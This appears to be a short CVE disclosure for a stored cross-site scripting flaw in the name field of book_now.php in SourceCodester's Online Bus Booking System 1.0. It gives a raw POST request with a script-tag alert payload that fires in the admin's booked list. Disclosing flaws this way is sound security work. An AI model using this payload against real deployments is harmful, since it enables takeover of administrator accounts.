# CVE-2020-25272

#Online Bus Booking System 1.0,there is XSS through the name parameter in book_now.php

#Vendor - SourceCodester

#Product - https://www.sourcecodester.com/php/14438/online-bus-booking-system-project-using-phpmysql.html V 1.0

#Vulnerability Type - Cross Site Scripting (XSS)

#Addition Information - Single XSS payload will trigger in all Dashboard, so account take over will be occurred.

#Affected Component - /bus_booking/book_now.php , /bus_booking/index.php?page=booked

#Attack Type- Local

#Privilege Escalation - true

#Impact Code execution - true

***Attack Vector***

> 1) Go to book_now.php and book bus ticket
>
>
> 2) In name field , set malicious XSS payload
>
> POST /bus_booking/book_now.php HTTP/1.1
>
> Cookie: PHPSESSID=5d6832eeb2a8dfd424c1b6dcd73745a0
>
>.....
>
> sid=2&bid=&name=<script>alert('XSS');</script>&qty=1
>
>
> 3) In Admin site, go to booked list, and stored XSS will be triggered
> 


